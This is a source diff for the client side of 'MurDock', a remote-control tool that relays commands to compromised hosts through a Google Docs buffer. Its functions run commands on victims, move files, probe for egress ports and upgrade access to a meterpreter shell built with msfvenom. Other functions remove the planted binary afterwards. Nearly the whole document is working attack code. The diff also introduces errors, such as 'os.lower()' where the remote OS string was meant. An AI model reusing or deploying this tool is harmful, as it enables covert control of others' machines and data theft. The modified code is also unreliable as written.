@@ -12,13 +12,13 @@ from gdoc_buffer import gdocClientBuffer
 from ast import literal_eval
 from string import ascii_uppercase, digits
 
-
-
-### GLOBALS ###
-
-# Debug Logging Object and Handle
-# Will log to file if exe
+VERSION = 1.1
+BLOCK_SIZE=2**10
 DEBUG = False
+
+remote_os = ''
+egress_port = ''
+sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0) # Unbuffered stdout
 
 logger = logging.getLogger('__docCLIENT__')
 if not DEBUG:
@@ -34,28 +34,13 @@ formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(messag
 ch.setFormatter(formatter)
 logger.addHandler(ch)
 
-# Remote OS, set in sync_up()
-OS = ''  
-
-# Egress Port, set in egress_bust(), cleared on sync_up()
-egress_port = ''
-
-# Blocksize Used in File Transfer
-BLOCK_SIZE=2**10
-
-# Force Unbuffered stdout
-sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)
-
-
 
 ### File Transfer Functions###
-
-# Upload file to remote host
 def upload(doc_buffer, cmd_str):
-    BLOCK_SIZE
+    """Upload file to remote host"""
     cmd_list = shlex.split(cmd_str)
     local_path = os.path.expandvars(cmd_list[1].replace('~','$HOME')) # expand & handle ~
-    if OS == 'Windows':
+    if remote_os == 'Windows':
         remote_path = shlex.split(cmd_str.replace('\\','\\\\'))[2]# pad removal of \ by shlex
     else:
         remote_path = cmd_list[2]
@@ -75,8 +60,8 @@ def upload(doc_buffer, cmd_str):
             return str(e)
         if can_send == "<OKAYSND>": #can upload?
             try:
-                fd = open(local_path,"rb") #open for readd
-                md5_obj = md5() # md5 object
+                fd = open(local_path,"rb") #open for read
+                md5_obj = md5()
                 file_size = os.path.getsize(local_path)
                 sent_size = 0
                 
@@ -134,12 +119,11 @@ def upload(doc_buffer, cmd_str):
         return "ERROR - local: Local File: " +  local_path + " does not exist."
 
 
-# Download remote file to local host
 def download(doc_buffer, cmd_str):
-    BLOCK_SIZE
+    """Download remote file to local host"""
     cmd_list = shlex.split(cmd_str)
-    if OS == 'Windows':
-        remote_path = shlex.split(cmd_str.replace('\\','\\\\'))[1]# pad removal of \ by shlex
+    if remote_os == 'Windows':
+        remote_path = shlex.split(cmd_str.replace('\\','\\\\'))[1] # pad removal of \ by shlex
     else:
         remote_path = cmd_list[1]
     local_path = os.path.expandvars(cmd_list[2].replace('~','$HOME')) # expand paths and handle ~ shortcut
@@ -148,8 +132,7 @@ def download(doc_buffer, cmd_str):
     can_rcv = ''
     exist_before = os.path.exists(local_path)
     
-    #can write local_path?
-    try:
+    try:  #can write local_path?
         open(local_path,"wb")
         doc_buffer.send_data(download_str)
     except IOError:
@@ -166,9 +149,8 @@ def download(doc_buffer, cmd_str):
             md5_obj = md5()
             file_size = int( can_rcv.split(".")[1] )
             rcv_size = 0
-            
-            #first block read
-            try:
+
+            try: #first block read
                 raw_data = doc_buffer.read_data()
             except Exception as e:
                 return str(e)
@@ -198,7 +180,7 @@ def download(doc_buffer, cmd_str):
                     data_lst = bin_data.split(".")
                     bin_data = data_lst[0]
                     file_hash = data_lst[1]
-                    doc_buffer.last_read_update( doc_buffer.get_to_read() ) #solves OBO error in transfer logic, may not be BEST solution
+                    doc_buffer.last_read_update( doc_buffer.get_to_read() ) #solves OBO error in transfer logic, not BEST solution
                     if file_hash == md5_obj.digest().encode('base64','strict'):
                         if os.path.exists(local_path):
                             os.remove(local_path)
@@ -227,20 +209,22 @@ def download(doc_buffer, cmd_str):
 
 
 ### SHELL UPGRADES ###
-
-# Check for egress TCP port
-# to an IPV4 address
-# TODO: Add UDP and IPv6
 def egress_bust(doc_buffer):
-    """Update topPorts file with the following command: 
-       sort -r -n -k 3 /<pathto>/nmap-services | grep -i tcp | awk '{print $2}' | cut -d/ -f1 > /<docDoorPath>/top-ports """
+    """Find egress port out of remote network
+    
+    Menu interface to select means to check for egress TCP port
+    Port checked against provided IPV4 address
+    To update topPorts file: 
+    sort -r -n -k 3 /<pathto>/nmap-services | grep -i tcp | awk '{print $2}' | cut -d/ -f1 > /<docDoorPath>/top-ports
+    TODO: Add UDP and IPv6 
+    """
     target_ip = ''
     port_list = ''
     top_ports_path = "../top-ports"
     min_port = 0
     max_port = 65535
     threads = 0
-    global EGRESS_PORT
+    global egress_port
     
     print "\n *** Choose an egress method (TCP only) ***\n"
     method = 99
@@ -307,10 +291,10 @@ def egress_bust(doc_buffer):
                 is_valid = False    
         port_list = ','.join(list(set(port_list)))
     elif method == 4:
-        if EGRESS_PORT:
+        if egress_port:
             return """
             *** Stored Egress Port for Session ***"
-                Port: """ + EGRESS_PORT + """ 
+                Port: """ + egress_port + """ 
                 We suggest confirming with egress method #3.
             """ 
         else:
@@ -385,20 +369,17 @@ def egress_bust(doc_buffer):
                 elif egress_list[1] == "<failed>":
                     return "\n*** ERROR: Egress Check Failed ***"
                 elif egress_list[1] == "<open>":
-                    EGRESS_PORT = egress_list[2].strip("<>")
-                    return "\n*** OPEN - Egress port: %s ***\n" % EGRESS_PORT    
+                    egress_port = egress_list[2].strip("<>")
+                    return "\n*** OPEN - Egress port: %s ***\n" % egress_port    
                 elif egress_list[1] == "<closed>":
                     return "\n*** CLOSED - All checked ports closed ***\n"
     except KeyboardInterrupt:
         print "Interrupt caught.\n"
         return
-
-        
-
     
-# Upgrade control to meterpreter shell
-# Takes user input and feeds to msfvenom
+
 def meter_up(doc_buffer):
+    """Upgrade control to meterpreter shell, leverages msfvenom"""
     ip = ''
     port = ''
     is_handler = ''
@@ -409,20 +390,20 @@ def meter_up(doc_buffer):
     payload_path = local_cmd("which msfpayload").rstrip('\r\n')
     if not venom_path or not payload_path:
         return "\n*** ERROR: msfvenom or msfpayload not found, exiting !meterup ***"
-    if OS.lower() != "windows":
+    if os.lower() != "windows":
         return "\n*** ERROR: victim not Windows platform, exiting !meterup ***"
     
     print "\n*** Interactive meterpreter Upgrade ***"
     while is_correct == 'no':
-        print "\nHint - Local IP: " + local_cmd("hostname -I").strip("\n") + " - External IP: <>" #TODO: Add remote query for IP address
+        print "\nHint - Local IP: " + local_cmd("hostname -I").strip("\n") + " - External IP: <>" #TODO: Add query for external IP address
         while ip == '':
             try:
                 ip = str(raw_input('LHOST IP Address ?: '))
             except:
                 ip = ''         
         print "\nHint - use !egress to acquire ports."
-        if not EGRESS_PORT == '':
-            print "Known OPEN: %s" % EGRESS_PORT    
+        if not egress_port == '':
+            print "Known OPEN: %s" % egress_port    
         while port == '':
             try:
                 port = str(raw_input('LPORT Port Number ?: '))
@@ -540,42 +521,43 @@ def forward_port(doc_buffer):
     return "*** ERROR: Removed from public release ***\n"
 
 
-# Executes commands on local system
-# Assumes Linux host 
-# parse bases on "" all following space input to pipe 
 def local_cmd(command_in):
+    """Executes commands on local system
+   
+    Assumes Linux host 
+    parse bases on "" all following space input to pipe 
+    """
     try:
         process = subprocess.Popen(command_in, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-        output = process.communicate() #TODO: consider changing to stdout, stderr = process.communicate() for clarity   
+        output = process.communicate() #TODO: Change to stdout, stderr = process.communicate() for clarity   
         if output[1] == '':
             return output[0]
         if output[0] and output[1]:
             return output[0] + output[1]
         else:
             return output[1]
-    except OSError:
-        return "\nERROR: OSError" #TODO, pass specific error back
-
+    except OSError as e:
+        return "\nERROR: OSError: %s" % e.msg
 
 
 ### HELPER FUNCTIONS ###
 
-# Prints Main Menu
 def intro_print():
+    """Print Main Menu."""
     print """
-        ~ MurDock v1.0 beta ~
+        ~ MurDock v%s beta ~
         Author: Themson Mester
         Release: Public
         License: MIT
         EULA: Be Excellent to each other
         Help: !help
-    """
+    """ % VERSION
     
 
-# Prints Help Menu
 def help_print():
+    """Print local Help Menu. Provide command format."""
     print """
-      ~ MurDock v1.0 Public ~
+      ~ MurDock v%s Public ~
       *** commands ***
       !help     - Print this help menu : (!h)
       !clear    - Clear local terminal : (!c)
@@ -596,16 +578,17 @@ def help_print():
       !exit     - Exit Local client only
         
       <:        - Send command to remote server
-    """
+    """ % VERSION
     
 
-# Clear local buffer   
 def clear_local():
+    """Clear local shell buffer."""
     print "\n" * 1000
    
 
-# Send shutdown signal to remote server
+
 def send_shutdown(doc_buffer):
+    """Send shutdown signal to remote server. Currently leaves bin behind."""
     affirmatives = ["y", "yes"]
     negatives = ["n", "no"]
     choice = ''
@@ -613,9 +596,8 @@ def send_shutdown(doc_buffer):
     print " *** Warning: Don't be Sloppy! ***"
     print "You are about to shut down the remote server, leaving behind a binary."
     
-    while choice == '':
-    #handle non-string types
-        try:
+    while choice == '': 
+        try: #handle non-string types
             choice = str(raw_input('Want to Be Sloppy? Y/N: '))
         except:
             choice = ''
@@ -638,22 +620,25 @@ def send_shutdown(doc_buffer):
             choice = ''
 
 
-# Send cleanup signal to remote server
-# and close local client
 def clean_up(doc_buffer):
+    """Send cleanup signal
+    
+    Remove server from remote host, shuts down and deletes files
+    Closes local client.
+    """
     affirmatives = ["y", "yes"]
     negatives = ["n", "no"]
     choice = ''
     
-    if OS.lower() != "windows":
-        print "\n*** Removal method not yet available for %s ***\n" % OS
+    if os.lower() != "windows":
+        print "\n*** Removal method not yet available for %s ***\n" % remote_os
         return
     
-    print "\n                       *** WARNING ***"
-    print "This feature is blind, there will be no feedback once executed."
-    print "You are about to SHUT DOWN the remote server, and REMOVE the binary."
-    
-    while choice == '':  #handle non-string types
+    print """\n                   *** WARNING ***"
+        This feature is blind, there will be no feedback once executed.
+        You are about to SHUT DOWN the remote server, and REMOVE the binary."""
+        
+    while choice == '': #handle non-string types
         try:
             choice = str(raw_input('\nAre you sure you want to CLEANUP now? Y/N: '))
         except:
@@ -678,8 +663,8 @@ def clean_up(doc_buffer):
             choice = ''
     
 
-# Print exit info for client exit
 def exit_client():
+    """Print exit info and exit local client."""
     print """
             ~ Exited Local MurDock Client ~
                 
@@ -689,9 +674,8 @@ def exit_client():
     sys.exit()
 
 
-# Retrieve remote system info  
-# Print and return data as list
 def sysinfo(doc_buffer):
+    """Retrieve remote system info. Print and return data as list"""
     print "\nPolling Remote Host for !sysinfo..."
     doc_buffer.send_data("!sysinfo")
     try:
@@ -706,26 +690,31 @@ def sysinfo(doc_buffer):
     return sysdata
 
 
-# Synch doc_buffers
-# Print and store system info
-# Sets Remote OS global var
 def sync_up(doc_buffer):
-    global OS
-    global EGRESS_PORT
-    EGRESS_PORT = ''
+    """Synchronize buffers
+    
+    Align sequence numbers etc per protocol wrapper
+    Print and store system info from remote system
+    SetsRemote remote_os global var
+    """
+    global remote_os
+    global egress_port
+    egress_port = ''
     if doc_buffer.sync_up():
         print "\n *** Connection with compromised host synchronized. ***"
         sysdata = sysinfo(doc_buffer)
-        OS = sysdata[0].split(":")[1].strip(" ")
+        remote_os = sysdata[0].split(":")[1].strip(" ")
         return True
     else:
         return False      
 
 
-## Watch for new shell in loop
-#  uses sync_up() bool in loop to watch for shell
-#  stop on True or keyboard interrupt
 def watch_new(doc_buffer):
+    """Watch for new server connections
+    
+    use sync_up() bool in loop to watch for server
+    stop on True or KeyboardInterrupt
+    """
     delay = 5
     print "\n *** Listening for compromised hosts ***"
     print "Exit listener with keyboard interrupt: ^c"
@@ -738,38 +727,33 @@ def watch_new(doc_buffer):
     except KeyboardInterrupt:
         print "Interrupt caught, watcher terminated\n"
         return
-    
-                
             
-# Main method
+   
 def main():     
-    #banner
-    intro_print()
-    #Instantiate doc_buffer object
-    try:
-        doc_buffer = gdocClientBuffer()
+    intro_print() # banner
+    try:  
+        doc_buffer = gdocClientBuffer() # Instantiate buffer object
     except Exception as e:
         print "*** ERROR: Failed to instantiate buffer. *** - " + str(e)
         exit_client()
            
-    ## primary input/send/read/output loop ##
     shell_input = ''
-    while (shell_input != '!exit'):      
-        #Local STDIN Read
+    while (shell_input != '!exit'): # primary input/send/read/output loop
         shell_input = ''
-        while shell_input == '':
-        #handle non-string types
+        while shell_input == '': # handle non-string types
             try:
                 shell_input = str(raw_input('<: '))
                 logger.debug("Main() shell_input set: " + shell_input)
             except:
                 shell_input = ''
        
-        #TODO: MOVE TO COMMAND PROCESSOR Function
-        #built-ins 
-        menu_drvn_cmds = ['!help', '!h', '!clear', '!c','!watch', '!sysinfo','!egress', '!meterup', '!forward', '!sync', '!exit', '!shutdown', '!cleanup']
+        menu_drvn_cmds = [
+                          '!help', '!h', '!clear', '!c','!watch',
+                          '!sysinfo','!egress', '!meterup', '!forward',
+                          '!sync', '!exit', '!shutdown', '!cleanup'
+                          ]
         parsed_cmds = ['!cmd ', '!upload','!download',]
-        if shell_input.startswith('!') and shell_input in menu_drvn_cmds:
+        if shell_input.startswith('!') and shell_input in menu_drvn_cmds: #TODO: MOVE TO COMMAND PROCESSOR Function
             if shell_input == '!help' or shell_input == '!h':
                 help_print()
             elif shell_input == '!clear' or shell_input == '!c':
@@ -785,7 +769,7 @@ def main():
             elif shell_input == '!forward':
                 print forward_port(doc_buffer)
             elif shell_input == '!sync':
-                print "Attempting to synchronize with compromised host server."
+                print "Attempting to synchronize with remote host server."
                 if not sync_up(doc_buffer):
                     print "\n*** SYNC FAILED: No server or Lost Auth ***" 
                     exit_client()        
@@ -796,7 +780,7 @@ def main():
             elif shell_input == "!cleanup":
                 clean_up(doc_buffer)
             
-        #Parsed Exec        
+        #Parse Exec        
         elif shell_input.startswith('!cmd '):
             print local_cmd( shell_input.split(" ", 1)[1] )           
         elif shell_input.startswith('!upload'):
@@ -804,16 +788,17 @@ def main():
         elif shell_input.startswith('!download'):
                 print download(doc_buffer, shell_input)
         
-
         #Handle invalid builtins
-        elif shell_input.startswith('!') and (shell_input not in menu_drvn_cmds) and (shell_input not in parsed_cmds):
+        elif (
+              shell_input.startswith('!') and
+              (shell_input not in menu_drvn_cmds) and
+              (shell_input not in parsed_cmds)
+              ):
             print "Built-in command \"" + shell_input + "\" not found."
+
         
-        #Raw cmd to remote host  
-        else:
-            #Send local STDIN
-            doc_buffer.send_data(shell_input)
-            #Read remote STDOUT 
+        else: #Raw cmd and read to remote host 
+            doc_buffer.send_data(shell_input) #TODO: may need to wrap in try except
             try:
                 srv_data = doc_buffer.read_data()
                 print "\n" + srv_data + "\n"
